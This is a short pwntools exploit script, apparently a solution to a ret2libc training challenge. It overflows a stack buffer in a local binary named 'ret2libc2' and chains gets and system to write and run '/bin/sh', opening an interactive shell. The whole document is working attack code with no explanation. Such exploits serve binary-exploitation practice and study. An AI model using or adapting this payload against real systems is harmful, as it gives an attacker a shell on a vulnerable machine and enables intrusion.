from pwn import *

sys_plt = 0x08048490
buff2 = 0x0804A080
gets_plt = 0x08048460
pop = 0x0804843d

eax = 0xffffd24c
ebp = 0xffffd2b8
offset = int(ebp-eax+4)

payload = b'a'*offset + p32(gets_plt) + p32(pop) + p32(buff2) + p32(sys_plt) + b'a'*4 + p32(buff2)

sh = process('./ret2libc2')
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
